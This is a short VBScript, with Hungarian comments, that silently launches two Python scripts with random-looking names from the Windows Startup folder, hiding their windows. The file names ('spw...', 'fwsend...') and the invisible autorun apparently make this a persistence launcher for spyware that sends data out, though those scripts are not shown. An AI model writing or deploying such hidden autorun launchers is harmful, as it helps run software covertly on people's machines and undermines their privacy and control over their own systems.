Option Explicit
Dim shell, startupPath, pythonExe, spwPath, sendPath

Set shell = CreateObject("WScript.Shell")

' Startup mappa helye
startupPath = shell.SpecialFolders("Startup")
' Python elérési út (ha máshol van, szólj és átírom)
pythonExe = "C:\Python312\python.exe"

' A két Python script elérési útja
spwPath = startupPath & "\spwww743g7w.py"
sendPath = startupPath & "\fwsendbfgw.py"

' Indítás láthatatlanul
shell.Run """" & pythonExe & """ """ & spwPath & """", 0, False
shell.Run """" & pythonExe & """ """ & sendPath & """", 0, False
